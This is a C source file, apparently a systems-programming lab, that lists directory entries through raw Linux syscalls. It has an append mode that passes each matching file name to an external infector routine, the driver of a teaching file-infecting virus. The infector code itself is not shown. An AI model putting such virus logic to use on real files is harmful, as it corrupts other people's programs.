#include "util.h"

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

/*access modes*/
#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDWR 2
#define O_CREATE 64
#define O_RWX 0777    /* read-write-execute for owner*/

#define STDIN 0
#define STDOUT 1
#define STDERR 2

/*DT definition (from dirent.h)*/
# define DT_UNKNOWN	0
# define DT_FIFO	1
# define DT_CHR		2
# define DT_DIR		4
# define DT_BLK		6
# define DT_REG		8
# define DT_LNK		10
# define DT_SOCK	12
# define DT_WHT		14

#define BUFFER_SIZE 8192

extern int system_call();
extern void code_start(void);
extern void code_end(void);
extern void infection(void);
extern void infector(char *);

typedef struct linux_dirent {
   unsigned long  ino;        /* Inode number */
   unsigned long  offset;     /* Offset to next linux_dirent */
   unsigned short len;        /* Length of this linux_dirent */
   char           name[];     /* Filename (null-terminated) */
}linux_dirent;

/*convert type of dirent to string*/
char* getType(char type){
  char* stringType;
  if(type==DT_REG)
    stringType="reguler";
  else if(type==DT_DIR)
    stringType="directory";
  else if(type==DT_FIFO)
    stringType="FIFO";
  else if(type==DT_SOCK)
    stringType="socket";
  else if(type==DT_LNK)
    stringType="symbolic link";
  else if(type==DT_BLK)
    stringType="block device";
  else if(type==DT_CHR)
    stringType="char device";
  else if(type==DT_UNKNOWN)
    stringType="unknown";
  else
    stringType="???";
  return stringType;
}

char* getSystemCall(int syscall){
  char* string_type;
  if(syscall==SYS_READ)
    string_type="SYS_READ";
  else if(syscall==SYS_OPEN)
    string_type="SYS_OPEN";
  else if(syscall==SYS_WRITE)
    string_type="SYS_WRITE";
  else if(syscall==SYS_EXIT)
    string_type="SYS_EXIT";
  else if(syscall==SYS_GETDENTS)
    string_type="SYS_GETDENTS";
  else if(syscall==SYS_CLOSE)
    string_type="SYS_CLOSE";
  else if(syscall==SYS_LSEEK)
    string_type="SYS_LSEEK";
  else
    string_type="???";
  return string_type;
}

void errorHandler(int output,char* message){
  system_call(SYS_WRITE,output,message, strlen(message));
  system_call(SYS_EXIT,0x55,0,0);
}

/*print the name and length of the file*/
void printDebug_file(linux_dirent* file){
  system_call(SYS_WRITE,STDERR,"name: ",strlen("name: "));
  system_call(SYS_WRITE,STDERR,file->name,strlen(file->name));
  system_call(SYS_WRITE,STDERR,"\t\t",2);
  system_call(SYS_WRITE,STDERR,"length: ",strlen("length: "));
  system_call(SYS_WRITE,STDERR,itoa(file->len),strlen(itoa(file->len)));
  system_call(SYS_WRITE,STDERR, "\n\n", strlen("\n\n"));
}

/*print the system call int value and the return value from kernel*/
void printDebug_sys_call(int sys_call, int return_value){
  system_call(SYS_WRITE,STDERR,"system call: ",strlen("system call: "));
  system_call(SYS_WRITE,STDERR,getSystemCall(sys_call),strlen(getSystemCall(sys_call)));
  system_call(SYS_WRITE,STDERR,"\t",1);
  system_call(SYS_WRITE,STDERR,"return value: ",strlen("return value: "));
  system_call(SYS_WRITE,STDERR,itoa(return_value),strlen(itoa(return_value)));
  system_call(SYS_WRITE,STDERR, "\n", strlen("\n"));
}

/*print the file name (and debug)*/
void printFile(int output,linux_dirent* file,int debug,int prefixMode,int appendMode,char type){
  int check=system_call(SYS_WRITE,output,file->name,strlen(file->name)); /* the main */
  int check2=1;
  if(prefixMode){
    system_call(SYS_WRITE, output,"\t", 1);
    check2=system_call(SYS_WRITE,output,getType(type),strlen(getType(type)));
  }
  else if(appendMode)
    infector(file->name);
  system_call(SYS_WRITE, output,"\n", 1);
  if(check<=0 || check2<=0)
    errorHandler(output,"write file's name error\n");
  if(debug){
    printDebug_sys_call(SYS_WRITE,check);
    if(prefixMode)
      printDebug_sys_call(SYS_WRITE,check2);
    printDebug_file(file);
  }
}

int main (int argc , char* argv[], char* envp[]){
  int output = STDOUT;
  int checkFile,i,dirLen;
  char buffer[BUFFER_SIZE];
  linux_dirent* file;
  char *prefix;
  int debug=0;
  int prefixMode=0;
  int appendMode=0;
  unsigned int code_start = (unsigned int)&code_start;
  unsigned int code_end = (unsigned int)&code_end;

  for(i=1; i<argc; i++){
    if((strcmp("-D",argv[i])==0))
      debug=1;
    else if(strncmp("-p",argv[i],2)==0){
      prefixMode=1;
      prefix=argv[i]+2;
      if(strlen(prefix)!=1)
        errorHandler(output,"the prefix parameter should be a single character\n");
    }
    else if(strncmp("-a",argv[i],2)==0){
      appendMode=1;
      prefix=argv[i]+2;
      if(strlen(prefix)!=1)
        errorHandler(output,"the prefix parameter should be a single character\n");
    }
    else
      errorHandler(output,"Invalid parameter\n");
  }
  system_call(SYS_WRITE, output, "FLAME 2 STRIKES!\n",strlen("FLAME 2 STRIKES!\n"));
  system_call(SYS_WRITE, output, "code_start: ",strlen("code_start: "));
  system_call(SYS_WRITE, output, itoa(code_start),strlen(itoa(code_start)));
  system_call(SYS_WRITE, output, "\n", 1);
  system_call(SYS_WRITE, output, "code_end: ",strlen("code_end: "));
  system_call(SYS_WRITE, output, itoa(code_end),strlen(itoa(code_end)));
  system_call(SYS_WRITE, output, "\n", 1);


  checkFile=system_call(SYS_OPEN,".",O_RDONLY,O_RWX);  /* get file descriptor of the directory*/
  if(debug)
    printDebug_sys_call(SYS_OPEN,checkFile);
  if(checkFile<=0)
    errorHandler(output,"open directory error\n");
  dirLen=system_call(SYS_GETDENTS,checkFile,buffer,BUFFER_SIZE); /* get buffer's struct's files directory*/
  if(debug){
    printDebug_sys_call(SYS_GETDENTS,dirLen);
    system_call(SYS_WRITE, output, "\n", 1);
  }
  if(dirLen<0){errorHandler(output,"getdents system call error\n");}

  i=0;
  while(i<dirLen){
    file=(linux_dirent*)(buffer+i); /* get the next file by the struct*/
    char type = *(buffer+i+file->len-1);
    if(prefixMode || appendMode){
      if(strncmp(prefix,file->name,1)==0)
        printFile(output,file,debug,prefixMode,appendMode,type);
    }
    else if(!prefixMode && !appendMode)
      printFile(output,file,debug,prefixMode,appendMode,type);
    i=i+file->len;
  }
  return 0;
}